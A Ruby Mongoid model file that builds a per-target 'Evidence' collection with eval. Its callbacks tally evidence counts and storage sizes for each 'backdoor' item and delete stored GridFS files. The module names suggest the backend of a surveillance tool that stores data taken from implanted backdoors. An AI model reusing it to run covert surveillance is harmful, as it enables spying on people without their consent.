require 'mongoid'

#module RCS
#module DB

class Evidence

  def self.collection_name(target)
    "evidence.#{target}"
  end

  def self.collection_class(target)

    classDefinition = <<-END
      class Evidence_#{target}
        include Mongoid::Document

        field :acquired, type: Integer
        field :received, type: Integer
        field :type, type: String
        field :relevance, type: Integer
        field :blotter, type: Boolean
        field :note, type: String
        field :item, type: Array         # backdoor BSON_ID
        field :data, type: Hash
    
        store_in Evidence.collection_name('#{target}')

        after_create :create_callback
        after_destroy :destroy_callback

        STAT_EXCLUSION = ['info', 'filesystem']

        protected
        def create_callback
          return if STAT_EXCLUSION.include? self.type
          backdoor = Item.find self.item.first
          backdoor.stat.evidence ||= {}
          backdoor.stat.evidence[self.type] ||= 0
          backdoor.stat.evidence[self.type] += 1
          backdoor.stat.size += self.data[:_grid_size] unless self.data[:_grid].nil?
          backdoor.stat.size += Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          backdoor.stat.grid_size += self.data[:_grid_size] unless self.data[:_grid].nil?
          backdoor.save
        end

        def destroy_callback
          return if STAT_EXCLUSION.include? self.type
          backdoor = Item.find self.item.first
          backdoor.stat.evidence ||= {}
          backdoor.stat.evidence[self.type] ||= 0
          backdoor.stat.evidence[self.type] -= 1
          backdoor.stat.size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          backdoor.stat.size -= Mongoid.database.collection("#{Evidence.collection_name(target)}").stats()['avgObjSize'].to_i
          backdoor.stat.grid_size -= self.data[:_grid_size] unless self.data[:_grid].nil?
          backdoor.save
          
          # drop the file (if any) in grid
          GridFS.instance.delete self.data[:_grid].first unless self.data[:_grid].nil?
        end
      end
    END
    
    classname = "Evidence_#{target}"
    
    if self.const_defined? classname.to_sym
      klass = eval classname
    else
      eval classDefinition
      klass = eval classname
    end
    
    return klass
  end

  def self.dynamic_new(id)
    klass = self.collection_class(id)
    return klass.new
  end

end

#end # ::DB
#end # ::RCS